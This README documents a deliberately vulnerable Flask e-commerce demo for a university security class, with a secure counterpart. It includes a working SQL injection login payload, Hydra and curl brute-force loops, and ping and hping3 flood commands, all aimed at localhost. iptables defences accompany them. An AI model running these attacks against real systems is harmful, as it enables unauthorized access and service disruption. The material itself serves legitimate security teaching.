# TechNest — E-commerce Security Demo

A minimal Flask + SQLite store used for a university network-security
presentation. Two modes run side by side so every attack can be shown against
the vulnerable app and then repeated against the secure one.

| Mode | URL | What it demonstrates |
|---|---|---|
| **Vulnerable** | http://127.0.0.1:5000 | HTTP · raw SQL string concatenation (SQL injection) · plaintext passwords |
| **Secure** | https://127.0.0.1:5001 | HTTPS (self-signed) · parameterized SQL · PBKDF2 password hashes |

Both modes seed their own database file (`store_vulnerable.db` /
`store_secure.db`) on startup and reset it, so both apps can run at the same
time and every run starts from the same state.

**Demo accounts (seeded in both modes):**

| Username | Password | Role |
|---|---|---|
| `admin` | `admin123` | Administrator |
| `alice` | `alice123` | Customer |
| `bob` | `123456` | Customer — weak password, used for the brute-force demo |

Screenshots of the running app are in this folder: `shot-1-storefront.png`,
`shot-2-vulnerable-login.png`, `shot-3-sqli-dashboard.png`,
`shot-4-vulnerable-admin.png`, `shot-5-secure-login.png`,
`shot-6-secure-admin.png`.

---

## 1. Setup

### Install dependencies

```powershell
pip install -r requirements.txt
```

`pyOpenSSL` is required for the self-signed HTTPS mode.

### Start each mode

Use **two terminals**. The app accepts a CLI flag (easiest on Windows) or the
`MODE` environment variable.

**Windows PowerShell (recommended):**

```powershell
# Terminal 1 — vulnerable app (HTTP :5000)
python security-demo-app.py --vulnerable

# Terminal 2 — secure app (HTTPS :5001)
python security-demo-app.py --secure
```

**macOS / Linux / Git Bash (env var alternative):**

```bash
MODE=vulnerable python security-demo-app.py
MODE=secure python security-demo-app.py
```

### Confirm each is reachable

- **Vulnerable:** open <http://127.0.0.1:5000> — the storefront loads over
  plain HTTP, red "VULNERABLE MODE" banner at the top.
- **Secure:** open <https://127.0.0.1:5001> — the browser warns about the
  self-signed certificate. Choose **Advanced → Continue**. The page loads with
  a green "SECURE MODE" banner.

Quick command-line check (Windows PowerShell):

```powershell
curl.exe -s -o NUL -w "%{http_code}\n" http://127.0.0.1:5000/
curl.exe -sk -o NUL -w "%{http_code}\n" https://127.0.0.1:5001/
```

On macOS/Linux use `curl` instead of `curl.exe`. Both commands should print
`200`.

> **Platform note:** the app runs on Windows, macOS and Linux. The `iptables`
> demos in sections 3–6 need **Linux** (a VM, WSL2, or a native Linux machine).
> Everything else — SQL injection, brute force, Wireshark — works on Windows.

---

## 2. SQL injection

**Vulnerable app — <http://127.0.0.1:5000/login>**

1. Open the login page.
2. In the **username** field, type exactly:

   ```
   admin' OR '1'='1' --
   ```

3. Type anything in the password field (or leave it blank).
4. Submit — you are logged in as **admin** without knowing the password.

Why: the vulnerable mode builds the query by string concatenation:

```python
query = f"SELECT ... FROM users WHERE username = '{username}' AND password = '{password}'"
```

The payload turns the `WHERE` clause into `username = 'admin' OR '1'='1'`, and
`--` comments out the password check.

**Secure app — <https://127.0.0.1:5001/login>**

Try the same string. The login fails with **"Invalid username or password."**
The parameterized query treats the whole string as a username, and no such
user exists.

---

## 3. Password attack

### Brute force against the vulnerable app

`wordlist.txt` in this folder contains a short list that includes bob's
password (`123456`).

**Hydra (http-post-form):**

```bash
hydra -l bob -P wordlist.txt -s 5000 127.0.0.1 \
  http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid username or password"
```

Hydra reports the password once it finds `123456`.

**Fallback — 3-line curl + wordlist loop (bash):**

```bash
for pw in $(cat wordlist.txt); do
  curl -s -L -c /tmp/cj -b /tmp/cj -d "username=bob" --data-urlencode "password=$pw" http://127.0.0.1:5000/login | grep -q "Welcome back, bob" && { echo "FOUND: $pw"; break; }
done
```

On Windows PowerShell the same loop is:

```powershell
foreach ($pw in Get-Content wordlist.txt) {
  $body = curl.exe -s -L -c "$env:TEMP\cj" -b "$env:TEMP\cj" -d "username=bob" --data-urlencode "password=$pw" http://127.0.0.1:5000/login
  if ($body -match 'Welcome back, bob') { Write-Host "FOUND: $pw"; break }
  Write-Host "tried: $pw"
}
```

### iptables defense for the secure app

The secure app still verifies passwords correctly — the brute force is stopped
at the network layer, not in the application code.

**Primary rule — connlimit (limit concurrent connections per IP):**

```bash
sudo iptables -A INPUT -p tcp --dport 5001 -m connlimit --connlimit-above 10 --connlimit-mask 32 -j DROP
```

This drops new connections beyond 10 concurrent connections from any single
source IP. Hydra's parallel tasks stall immediately.

**Alternative — hashlimit (limit attempts over time per IP):**

```bash
sudo iptables -A INPUT -p tcp --dport 5001 -m hashlimit --hashlimit-name login --hashlimit-mode srcip --hashlimit-above 10/min --hashlimit-burst 5 -j DROP
```

This allows roughly 10 attempts per minute per IP; everything beyond that is
dropped.

**Before:** the loop/hydra runs through the wordlist in seconds.
**After:** most attempts time out or are dropped; the wordlist takes far
longer and the attack is no longer practical.

Remove the rule after the demo (or flush your test rules):

```bash
sudo iptables -D INPUT -p tcp --dport 5001 -m connlimit --connlimit-above 10 --connlimit-mask 32 -j DROP
sudo iptables -D INPUT -p tcp --dport 5001 -m hashlimit --hashlimit-name login --hashlimit-mode srcip --hashlimit-above 10/min --hashlimit-burst 5 -j DROP
```

---

## 4. Wireshark

> Capture tip: on Linux capture on the `lo` interface. On Windows you need
> Npcap with loopback support and the "Npcap Loopback Adapter".

### HTTP Traffic Analysis (Unencrypted)

- Start packet capture in Wireshark on the loopback interface.
- Access the vulnerable HTTP test page and submit the login form.
- Apply the display filter: `http`
- Examine the HTTP request and packet details — point out that the
  username and password appear as plain text in the packet.

### HTTPS Traffic Analysis (Encrypted)

- Start a new packet capture.
- Access the secure HTTPS app and submit the login form.
- Apply the display filter: `tls`
- Examine the TLS handshake, then the encrypted application data —
  point out that the credentials are not visible.

### Results — Practical Comparison

| | HTTP | HTTPS |
|---|---|---|
| Encryption | No TLS encryption. | Yes, encrypts data using TLS/SSL. |
| Application data visibility | Application data may be readable in packet captures. | Encrypted, content is not readable by observers. |
| TLS handshake | Not applicable. | Occurs before data exchange to establish secure connection. |

**HTTPS provides essential security by encrypting data in transit and verifying the server's identity, significantly enhancing confidentiality compared to HTTP.**

---

## 5. DDoS

### Attack against the vulnerable app

ICMP flood at the host:

```bash
sudo ping -f 127.0.0.1
```

TCP flood at the vulnerable web port:

```bash
sudo hping3 --flood -p 5000 127.0.0.1
```

The page becomes slow or unresponsive while the flood runs.

### iptables protection for the secure port

Add these rules **before** repeating the attack against port 5001:

```bash
# TCP flood protection: accept at most 10 packets/sec, drop the rest
sudo iptables -A INPUT -p tcp --dport 5001 -m limit --limit 10/sec --limit-burst 20 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 5001 -j DROP

# If you also flood with ICMP, rate-limit echo requests
sudo iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 10/sec --limit-burst 20 -j ACCEPT
sudo iptables -A INPUT -p icmp --icmp-type echo-request -j DROP
```

**Before:** the flood saturates the port; the site barely responds.
**After:** only ~10 packets per second are accepted, the rest are dropped, and
the site stays responsive while the flood continues.

Remove the rules after the demo:

```bash
sudo iptables -D INPUT -p tcp --dport 5001 -m limit --limit 10/sec --limit-burst 20 -j ACCEPT
sudo iptables -D INPUT -p tcp --dport 5001 -j DROP
sudo iptables -D INPUT -p icmp --icmp-type echo-request -m limit --limit 10/sec --limit-burst 20 -j ACCEPT
sudo iptables -D INPUT -p icmp --icmp-type echo-request -j DROP
```

---

## 6. ACL

iptables works on IP addresses and ports, not URLs — so the ACL restricts the
whole HTTPS port, and `/admin` is the page used to show the effect.

Allow only one IP (replace `192.168.1.100` with the presenter's machine):

```bash
sudo iptables -A INPUT -p tcp --dport 5001 -s 192.168.1.100 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 5001 -j DROP
```

**From the allowed IP — admin page loads:**

```bash
curl -k https://192.168.1.100:5001/admin
```

**From another IP — blocked.** On a single Linux machine you can simulate a
second source address with the loopback range:

```bash
curl -k --interface 127.0.0.2 https://127.0.0.1:5001/admin
```

This connection is dropped (timeout / connection refused), while the allowed
address still works. From a second VM or laptop, simply open the URL and it
will fail the same way.

Remove the rules after the demo:

```bash
sudo iptables -D INPUT -p tcp --dport 5001 -s 192.168.1.100 -j ACCEPT
sudo iptables -D INPUT -p tcp --dport 5001 -j DROP
```

---

## 7. What we intentionally simplified

So we can answer scope questions honestly — this is a teaching demo, not
production code:

1. **No CSRF protection** on the login form.
2. **Self-signed certificate** instead of a real CA-issued certificate.
3. **No application-level rate limiting or MFA** — those are demonstrated
   with iptables, not application code.
4. **No authorization check on `/admin`** — the ACL/iptables demo is the
   control being taught.
5. **Hardcoded Flask secret key** — fine for a demo, not for production.
6. **Flask development server** — not a production WSGI deployment.
7. **SQLite file database** — no concurrent-write handling.
8. **No password policy** — bob's weak password is intentional for the demo.
9. **No HTTP→HTTPS redirect** — both modes run side by side on purpose.
10. **Simplified product catalog** — 5 products, no cart, no checkout.

**Why:** the goal is to show that network controls (iptables, ACLs, TLS) and
application controls (parameterized queries, password hashing) solve different
problems and complement each other.

---

## Cleanup

Stop the apps with `Ctrl+C` in each terminal. Remove the seeded databases and
any temporary files:

```powershell
Remove-Item store_vulnerable.db, store_secure.db -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\cj" -ErrorAction SilentlyContinue
```

They are recreated automatically the next time each mode starts.

---

## Troubleshooting

| Problem | Fix |
|---|---|
| `Address already in use` | Another process owns port 5000/5001. Stop it or change `PORT` in the script. |
| Browser warns on :5001 | Expected — self-signed cert. Click Advanced → Continue. |
| `ModuleNotFoundError: flask` | Run `pip install -r requirements.txt` with the same Python that runs the app. |
| Wireshark shows no loopback traffic (Windows) | Install Npcap with loopback support and capture on the Npcap Loopback Adapter. |
| `iptables: Permission denied` | Run with `sudo` on Linux. iptables does not exist on Windows. |
| Brute-force loop reports a false positive | Match on `Welcome back, bob` — the login page subtitle also contains "Welcome back". |
| SQL injection payload is rejected | Make sure you are on **:5000** (vulnerable), not :5001. Curly quotes and long dashes from slides are normalized automatically, so copied payloads also work. |
| A restart/change seems ignored | Several app copies may be running. Stop them all, then start fresh: `Get-CimInstance Win32_Process -Filter "Name='python.exe'" \| Where-Object { $_.CommandLine -match 'security-demo-app' } \| ForEach-Object { Stop-Process -Id $_.ProcessId -Force }` |
